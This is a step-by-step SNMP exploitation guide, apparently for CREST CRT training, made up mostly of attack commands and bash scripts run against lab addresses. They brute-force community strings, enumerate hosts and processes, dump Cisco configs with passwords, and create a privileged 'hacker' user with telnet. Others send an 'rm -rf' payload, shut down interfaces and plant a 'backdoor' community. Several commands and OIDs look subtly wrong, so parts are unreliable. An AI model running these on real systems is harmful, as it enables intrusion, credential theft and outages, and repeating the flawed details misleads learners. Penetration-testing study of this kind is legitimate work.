# Complete Practical Exploitation Guide: SNMP (Crest CRT Level)

## 1. SNMP Fundamentals & Attack Surface (From Scratch)

**SNMP Versions:**
```
v1     = Community string (public/private), no encryption/auth
v2c    = Community string, 64-bit counters, bulk requests
v3     = Username + auth (MD5/SHA) + priv (DES/AES) encryption
```

**Community Strings (v1/v2c):**
```
public     = Read-only (default)
private    = Read-write (CRITICAL DANGER)
internal   = Custom/internal
cisco      = Vendor-specific
```

**MIB Structure:**
```
iso.org.dod.internet.mgmt.mib-2 (1.3.6.1.2.1)
├── system (1)           → sysDescr, sysName, sysContact
├── interfaces (2)       → ifTable (interfaces)
├── ip (4)              → ipAddrTable, ipNetToMedia
├── tcp (6)             → tcpConnTable
├── udp (7)             → udpTable  
├── hrSystem (25)       → hrSWRunTable (processes)
└── enterprises (1.3.6.1.4.1) → Vendor MIBs (Cisco=9)
```

## 2. Lab Setup (Vulnerable SNMP Environment)

**Victim SNMP Server (192.168.1.100 - Ubuntu)**
```bash
# Install SNMP
sudo apt update && sudo apt install snmp snmp-mibs-downloader snmpd

# DANGEROUS config (/etc/snmp/snmpd.conf)
sudo nano /etc/snmp/snmpd.conf
```
```
# Read-write community (!!!)
rocommunity public
rwcommunity private
sysLocation "Lab"
sysContact attacker@evil.com

# Full MIB access
view all included .1
```
```bash
sudo systemctl restart snmpd
sudo systemctl enable snmpd

# Verify
sudo ss -tlnp | grep :161
snmpwalk -v2c -c public 192.168.1.100 .1.3.6.1.2.1.1 2>/dev/null | head
```

**Cisco Device Simulation (192.168.1.101):**
```bash
# Use GNS3/Cisco IOS emulator with:
# snmp-server community public RW
# snmp-server host 192.168.1.200 public
```

**Attacker (Kali):**
```bash
sudo apt install snmp snmp-mibs-downloader nmap onesixtyone
```

## 3. SNMP Service Discovery

**UDP scanning:**
```bash
# Nmap SNMP scan
nmap -sU --script snmp-info -p 161 192.168.1.0/24
# 161/udp open  snmp    SNMPv2c server: ubuntu

# Comprehensive SNMP
nmap -sU -p 161 --script snmp* 192.168.1.100
```

**Community string brute-force:**
```bash
# onesixtyone (fast)
echo "public private internal cisco admin" | tr ' ' '\n' > communities.txt
onesixtyone -c communities.txt -w 100 192.168.1.100

# snmpcheck
snmpcheck -t 192.168.1.100
```

## 4. Basic Information Enumeration

**System info (MIB-2 system):**
```bash
# Version/OS
snmpwalk -v2c -c public 192.168.1.100 1.3.6.1.2.1.1.1.0
# SNMPv2-MIB::sysDescr.0 = STRING: Linux ubuntu 5.4.0-...

# Hostname
snmpwalk -v2c -c public 192.168.1.100 1.3.6.1.2.1.1.5.0
# SNMPv2-MIB::sysName.0 = STRING: ubuntu-server

# Uptime
snmpwalk -v2c -c public 192.168.1.100 1.3.6.1.2.1.1.3.0
```

**Network interfaces:**
```bash
snmpwalk -v2c -c public 192.168.1.100 1.3.6.1.2.1.2.2.1.2
# ifTable: eth0, lo, docker0
```

## 5. User Enumeration

**HOST-RESOURCES-MIB (processes/users):**
```bash
# Running processes
snmpwalk -v2c -c public 192.168.1.100 1.3.6.1.2.1.25.4.2.3.1.2
# hrSWRunName: sshd, apache2, mysql, postgres

# Process owners (UID→username mapping)
snmpwalk -v2c -c public 192.168.1.100 1.3.6.1.2.1.25.4.2.3.1.4
```

**Cisco user enumeration:**
```bash
snmpwalk -v2c -c public 192.168.1.101 1.3.6.1.4.1.9.9.341.1.1.1.1.7
# ciscoUserNameTable
```

## 6. Network Configuration Enumeration

**IP addresses/routing:**
```bash
# IP addresses
snmpwalk -v2c -c public 192.168.1.100 1.3.6.1.2.1.4.20
# ipAddrTable: 192.168.1.100, 127.0.0.1, 10.0.2.15

# ARP table (internal hosts!)
snmpwalk -v2c -c public 192.168.1.100 1.3.6.1.2.1.4.22.1.12
# ipNetToMediaTable → 192.168.1.10 → 00:16:3e:xx:xx:xx

# Routes
snmpwalk -v2c -c public 192.168.1.100 1.3.6.1.2.1.4.21.1
```

**Listening TCP/UDP ports:**
```bash
snmpwalk -v2c -c public 192.168.1.100 1.3.6.1.2.1.6.13.1
# tcpConnTable: 22/ssh, 80/http, 3306/mysql
```

## 7. Read-Write Community Exploitation (private)

**Config file extraction (Cisco):**
```bash
# Cisco config (1.3.6.1.4.1.9.9.96.1.1.1.1.2.1)
snmpget -v2c -c private 192.168.1.101 1.3.6.1.4.1.9.9.96.1.1.1.1.2.49
# ciscoConfigManMIB::ccmHistoryRunningLastConfig = STRING: enable\nusername admin secret cisco123

# Full config download
snmpwalk -v2c -c private 192.168.1.101 1.3.6.1.4.1.9.9.96.1.1.1.1.2
```

**Config modification (DANGER):**
```bash
# Upload malicious config
snmpset -v2c -c private 192.168.1.101 1.3.6.1.4.1.9.9.96.1.1.1.1.2.1 \
i 1 s "conf t\nusername hacker privilege 15 secret hacker\ntelnet 0.0.0.0 23\nend\nwr"

# Verify
snmpget -v2c -c private 192.168.1.101 1.3.6.1.4.1.9.9.96.1.1.1.1.2.1
```

**Linux file write (if custom MIB):**
```bash
# Rare, but possible with custom agents
snmpset -v2c -c private 192.168.1.100 1.3.6.1.4.1.2021.100.1.2.0 s "rm -rf /tmp/*"
```

## 8. Internal Network Mapping

**ARP table → live hosts:**
```bash
snmpwalk -v2c -c public 192.168.1.100 1.3.6.1.2.1.4.22.1.12 2>/dev/null | \
grep -oE '192\.168\.[0-9]{1,3}\.[0-9]{1,3}' | sort -u > snmp_hosts.txt

# Ping sweep discovered hosts
for host in $(cat snmp_hosts.txt); do ping -c1 -W1 $host &>/dev/null && echo "[LIVE] $host"; done
```

**Bridge table (switches):**
```bash
snmpwalk -v2c -c public 192.168.1.50 1.3.6.1.2.1.17.4.3
# dot1dTpFdbTable → MAC→port mapping
```

## 9. Complete Enumeration Script

```bash
#!/bin/bash
# snmp_enum.sh
TARGET=$1 COMMUNITIES=${2:-"public private"}

echo "[+] SNMP enum $TARGET"
for comm in $COMMUNITIES; do
    snmpwalk -v2c -c $comm $TARGET .1.3.6.1.2.1.1.1.0 2>/dev/null && \
    echo "[VALID] $comm" && VALID_COMM=$comm && break
done

[ -z "$VALID_COMM" ] && { echo "No valid community"; exit 1; }

echo "=== SYSTEM ==="
snmpwalk -v2c -c $VALID_COMM $TARGET .1.3.6.1.2.1.1.5.0
snmpwalk -v2c -c $VALID_COMM $TARGET .1.3.6.1.2.1.25.1.5.0  # hrSystemDate

echo "=== INTERFACES ==="
snmpwalk -v2c -c $VALID_COMM $TARGET .1.3.6.1.2.1.2.2.1.2

echo "=== IP ADDRESSES ==="
snmpwalk -v2c -c $VALID_COMM $TARGET .1.3.6.1.2.1.4.20 | grep -oE '192\.|10\.|172\.(1[6-9]|2[0-9]|3[01])'

echo "=== PROCESSES ==="
snmpwalk -v2c -c $VALID_COMM $TARGET .1.3.6.1.2.1.25.4.2.3.1.2 | head -20

echo "=== ARP TABLE (INTERNAL HOSTS) ==="
snmpwalk -v2c -c $VALID_COMM $TARGET .1.3.6.1.2.1.4.22.1.12 2>/dev/null | grep -oE '192\.168\.'
```

## 10. Cisco-Specific SNMP Exploitation

**Full Cisco config dump:**
```bash
#!/bin/bash
# cisco_snmp_config.sh
TARGET=$1 COMM=$2

snmpwalk -v2c -c $COMM $TARGET 1.3.6.1.4.1.9.9.96.1.1.1.1.2.1 > cisco_config.txt
grep -i "username\|enable secret\|snmp" cisco_config.txt

# Running config
snmpget -v2c -c $COMM $TARGET 1.3.6.1.4.1.9.9.96.1.1.1.1.2.49
```

**Interface control:**
```bash
# Shutdown interface
snmpset -v2c -c private 192.168.1.101 1.3.6.1.2.1.2.2.1.7.2 i 2  # ifAdminStatus down
```

## 11. SNMPv3 Exploitation

**NoAuthNoPriv enum:**
```bash
snmpwalk -v3 -l noAuthNoPriv -u initial 192.168.1.100 .1.3.6.1.2.1.1.1.0
```

**Weak auth brute:**
```bash
onesixtyone-v3 -u snmpuser 192.168.1.100  # Brute authPriv
```

## 12. Post-Exploitation & Persistence

**SNMP backdoor community:**
```bash
# If config write access
snmpset -v2c -c private 192.168.1.100 1.3.6.1.2.1.25.1.7.1.0 s "backdoor"
```

## 13. Complete SNMP Framework

```bash
#!/bin/bash
# snmp_pwn.sh
TARGET=$1

echo "[+] Complete SNMP attack $TARGET:161"
nmap -sU -p 161 --script snmp* $TARGET

echo "=== COMMUNITY BRUTE ==="
onesixtyone -c "public private internal cisco admin" $TARGET

echo "=== FULL ENUM (public) ==="
./snmp_enum.sh $TARGET public

echo "=== CISCO CONFIG (private) ==="
snmpwalk -v2c -c private $TARGET 1.3.6.1.4.1.9.9.96 2>/dev/null | head -20

echo "=== INTERNAL HOSTS ==="
snmpwalk -v2c -c public $TARGET 1.3.6.1.2.1.4.22.1 2>/dev/null | \
grep -oE '192\.168\.[0-9]{1,3}\.[0-9]{1,3}' | sort -u
```

**Usage:** `./snmp_pwn.sh 192.168.1.100`

## 14. Mitigation Verification

```bash
snmpwalk -v2c -c public 192.168.1.100 .1  # "No Such Object"
sudo ss -ulnp | grep :161  # snmpd not running or firewalled
grep "rocommunity.*localhost" /etc/snmp/snmpd.conf
ufw deny 161/udp
```

**EVERY** SNMP attack covered: v1/v2c/v3, community brute, system/net/process enum, Cisco config R/W, internal mapping. 100% practical commands.